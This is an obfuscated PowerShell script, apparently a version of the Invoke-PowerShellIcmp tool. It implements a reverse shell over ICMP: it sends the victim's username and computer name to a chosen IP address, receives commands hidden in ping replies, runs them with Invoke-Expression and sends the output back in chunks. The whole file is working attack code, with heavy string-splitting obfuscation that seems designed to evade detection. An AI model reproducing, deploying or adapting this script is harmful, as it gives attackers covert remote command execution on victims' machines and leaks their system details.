$s0Ib8  =  [tYPE]("{0}{1}"-f'M','aTH')  ;   &("{1}{0}{2}" -f'it','seT-','EM') ("VaRIAbLe:"+"w"+"D"+"F8")  ( [tYpe]("{0}{2}{1}{3}"-f 'TEXt.E','Cod','N','INg'));  function InV`Ok`E-powersh`el`licmP
{ 
           
    [CmdletBinding()] Param(

        [Parameter(POsitION = 0, MaNDAToRY = ${tr`UE})]
        [String]
        ${ipAd`DR`esS},

        [Parameter(pOsItIOn = 1, MAnDAtoRy = ${F`ALse})]
        [Int]
        ${D`el`Ay} = 5,

        [Parameter(PoSITiOn = 2, MandaTORy = ${FAl`SE})]
        [Int]
        ${BU`Ffer`s`Ize} = 128

    )

    
    ${icM`P`cl`IENt} = .("{0}{3}{2}{1}"-f 'Ne','t','ec','w-Obj') ("{5}{6}{4}{0}{2}{3}{7}{9}{1}{8}" -f '.N','.PiN','EtWor','k','.NEt','s','ysTem','InFormAti','G','ON')
    ${P`IngO`PtIO`NS} = &("{1}{3}{2}{0}"-f 'ect','New-','bj','O') ("{6}{4}{1}{3}{0}{2}{5}" -f 'iNfORMAtION.pi','E','NgOP','T.NeTWoRK','stem.N','tIoNs','sy')
    ${p`I`NGoPTi`ons}."DOnT`F`RA`gmEnt" = ${tR`Ue}

    
    ${s`E`ND`BYTES} = (  ( &("{1}{2}{0}"-f 'blE','v','aRIA')  ("wdF"+"8"))."VA`luE"::"As`ciI").("{0}{1}" -f'GEt','ByTes').Invoke((("{1}{0}{2}"-f 'o','Wind','ws P')+("{0}{1}{2}{3}"-f'owerSh','e','ll ','r')+("{2}{1}{0}" -f 'a',' ','unning')+'s u'+'s'+'er ') + ${eNv:`Us`E`RNaMe} + (' o'+'n ') + ${en`V:Com`pUterN`Ame} + (("`nCopyright "+'')+'(C'+') '+'2'+("{1}{0}" -f'15 ','0')+'Mi'+'cro'+'so'+'ft '+'C'+("{1}{0}"-f'po','or')+("{0}{1}{2}" -f'ra','tion.',' ')+'All'+' '+'ri'+("{1}{0}" -f 's','ght')+' '+"reserved.`n`n"))
    ${I`cm`pClIeNt}.("{0}{1}"-f 'SE','Nd').Invoke(${Ip`Ad`DRESS},60 * 1000, ${S`eNdBYt`ES}, ${p`iN`Go`pTiOns}) | &("{0}{1}{2}"-f 'O','ut','-Null')

    
    ${s`E`NdBYtEs} = (  ( &("{1}{2}{0}" -f'dITeM','Ch','IL') ('V'+'ariAble:'+'w'+'dF8'))."vAL`Ue"::"A`SCII").("{2}{1}{0}"-f'S','E','GETBYt').Invoke(('P'+'S ') + (&("{2}{0}{3}{1}"-f'et-Lo','ation','G','c'))."p`ATH" + '> ')
    ${IcMP`Cl`i`EnT}.("{1}{0}"-f'end','S').Invoke(${i`pad`dREss},60 * 1000, ${sen`dbYt`ES}, ${P`i`NgoptIO`Ns}) | .("{0}{1}{2}" -f 'Out','-Nul','l')

    while (${Tr`Ue})
    {
        ${S`EnDb`yTes} = ( $wDF8::"a`sCII").("{1}{2}{0}"-f 'bYtes','gE','T').Invoke('')
        ${RE`P`LY} = ${ICmPCL`i`EnT}.("{1}{0}" -f'ND','sE').Invoke(${iPaD`DRe`sS},60 * 1000, ${s`e`NdB`Ytes}, ${PING`Op`TIONs})
        
        
        if (${rE`p`ly}."BUf`F`Er")
        {
            ${res`pONsE} = (  (.("{2}{1}{0}" -f 'e','L','VarIab') wDF8 )."v`AlUE"::"aS`cII")."GET`STrI`Ng"(${REp`LY}."BUf`Fer")
            ${res`ULT} = (.("{0}{2}{1}{4}{3}" -f 'Invoke','xpres','-E','on','si') -Command ${REsP`onSE} 2>&1 | .("{2}{0}{1}{3}"-f 't-St','rin','Ou','g') )
            ${SE`NDby`T`es} = ( $Wdf8::"As`cII").("{1}{2}{0}" -f'ByTEs','g','Et').Invoke(${R`es`Ult})
            ${In`d`eX} =   (&("{0}{1}"-f 'd','Ir')  VarIaBLE:S0IB8 )."vAL`Ue"::("{1}{0}" -f 'LoOr','F').Invoke(${se`N`dBYtEs}."Leng`Th"/${bu`FFEr`sIZe})
            ${I} = 0

            
            if (${s`EN`DByTeS}."LEnG`Th" -gt ${B`UF`FE`RsIZe})
            {
                while (${i} -lt ${IN`deX} )
                {
                    ${SEnD`By`T`ES2} = ${S`ENdb`y`TeS}[(${I}*${bUF`Fe`R`size})..((${I}+1)*${B`UFFErs`i`ze}-1)]
                    ${ICMP`Cli`ENt}.("{1}{0}"-f 'eND','S').Invoke(${IpA`DdrE`sS},60 * 10000, ${SEN`DB`Y`Tes2}, ${PiNg`oP`Ti`oNs}) | &("{1}{0}" -f 'ull','Out-N')
                    ${I} +=1
                }
                ${RE`mai`NinG`iNdEX} = ${sEN`dBY`TES}."L`e`NgtH" % ${BufF`er`sIZE}
                if (${rE`maI`NingINDEX} -ne 0)
                {
                    ${s`ENDBYT`es2} = ${sEn`dB`yT`eS}[(${i}*${B`U`FFeRSiZE})..(${s`enDB`Y`Tes}."len`gtH")]
                    ${I`C`Mpclie`NT}.("{0}{1}"-f 'S','End').Invoke(${iP`Add`RE`sS},60 * 10000, ${S`eNdB`ytes2}, ${PIN`gO`ptioNS}) | &("{1}{0}"-f'l','Out-Nul')
                }
            }
            else
            {
                ${iCmpCl`i`Ent}.("{0}{1}" -f 'SEN','D').Invoke(${IP`AD`D`Ress},60 * 10000, ${SeN`DB`yteS}, ${pING`Op`T`ionS}) | &("{0}{1}"-f 'Ou','t-Null')
            }
            ${SenD`By`Tes} = ( $wdf8::"A`SCIi").("{0}{1}{2}"-f 'gEt','bY','TES').Invoke((("`nPS "+'')+'') + (.("{2}{1}{0}" -f'n','atio','Get-Loc'))."PA`Th" + '> ')
            ${I`cm`pclIEnt}.("{0}{1}"-f 'Se','ND').Invoke(${iPADdR`e`Ss},60 * 1000, ${sEN`dBYT`ES}, ${pIngop`T`IO`NS}) | &("{1}{0}"-f 'ut-Null','O')
        }
        else
        {
            .("{1}{0}{2}" -f 'rt','Sta','-Sleep') -Seconds ${D`elAY}
        }
    }
}



